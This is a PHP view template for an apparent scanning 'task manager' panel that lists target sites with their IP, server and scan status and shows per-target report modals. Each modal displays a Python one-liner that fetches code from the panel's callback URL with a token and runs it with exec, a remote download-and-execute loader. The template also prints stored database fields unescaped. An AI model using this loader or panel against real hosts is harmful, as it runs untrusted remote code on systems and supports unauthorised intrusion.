<?php 
if(!defined('EMLOG_ROOT')) {exit('error!');} 
IsLogin();
?>
<div class="container-fluid">
      <div class="row-fluid">
        <?php include View::getview("left_side");?>
        <div class="span9">
		  <div class="row-fluid">
			<div class="page-header">
				<h1>任务管理 <small>Task Manager</small></h1>
			</div>
			<table class="table table-striped table-bordered table-condensed">
				<thead>
					<tr>
						<th>ID</th>
						<th>目标</th>
						<th>网站标题</th>
						<th>网站IP</th>
						<th>环境</th>
                        <th>备注</th>
						<th>Status</th>
						<th></th>
					</tr>
				</thead>
				<tbody>
				<?php 
				foreach($LogData as $k=>$v):
				$website_data = json_decode(base64_decode($v["result"]),true);
				?>
				<tr class="list-users">
					<td><?php echo $k+1;?></td>
					<td><?php echo $v["url"];?></td>
					<td><?php echo $website_data["title"]?$website_data["title"]:"未获取到网站标题";?></td>
					<td><?php echo $website_data["ip"]?$website_data["ip"]:"未获取到网站ip";?></td>
					<td><?php echo $website_data["server"]?$website_data["server"]:"未获取到网站环境";?></td>
					<td><?php echo $v["descript"];?></td>
					<td><?php 
					if($v["status"]==0){
						echo '<span class="label label-warning">Scaning</span>';
					}else{
						echo '<span class="label label-success">Finished</span>';
					}
					?></td>
					<td>
						<div class="btn-group">
							<a class="btn btn-mini dropdown-toggle" data-toggle="dropdown" href="#">Actions <span class="caret"></span></a>
							<ul class="dropdown-menu">
								<li><a data-toggle="modal" data-target="#myModa<?php echo $k+1;?>"><i class="icon-user"></i> Details</a></li>
								<li><a href="?delete/<?php echo $v["id"];?>"><i class="icon-trash"></i> Delete</a></li>
							</ul>
						</div>
					</td>
				</tr>
				
				<?php endforeach;?>
				</tbody>
			</table>
			<?php 
			foreach($LogData as $k=>$v):
			$website_data = json_decode(base64_decode($v["result"]),true);
			?>
			<div class="modal fade" id="myModa<?php echo $k+1;?>" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel">
					<div class="modal-dialog modal-lg" role="document">
						<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							<h4 class="modal-title" id="myModalLabel">漏洞扫描报告</h4>
						</div>
						<div class="modal-body">
					<div class="alert alert-info alert-dismissible" role="alert">
						<?php $callback_url = BLOG_URL.'?get/'.$v["token"];?>
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						<strong>命令参数：</strong><code>python -c"exec(__import__('urllib').urlopen('<?php echo $callback_url;?>').read())"</code>
					</div>
						<?php 
						$rows = '<table class="table table-bordered">
								<thead>
									<tr>
										<th>
											标题
										</th>
										<th>
											内容
										</th>
									</tr>
								</thead>
								<tbody>';
								if(count($website_data)>0){
								foreach($website_data as $_k=>$_v){
										if(is_array($_v)){
											$_content = "";
											foreach($_v as $_vv){
												$_content .= $_vv."</br>";
											}
											$rows .= "<tr><td>$_k</td><td>$_content</td></tr>";
										}else{
											$rows .= "<tr><td>$_k</td><td>$_v</td></tr>";
										}
									}
								}
						
						$rows .="</tbody>
							</table>";
						echo $rows;	
						?>
						
						</div>
						<div class="modal-footer">
							<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
							<button type="button" class="btn btn-primary" data-dismiss="modal">确定</button>
						</div>
						</div>
					</div>
					</div>
			<?php endforeach;?>
			
			<a href="?task_add" class="btn btn-success">New Task</a>
		  </div>
        </div>
      </div>
 
    <?php include View::getview("footer");?>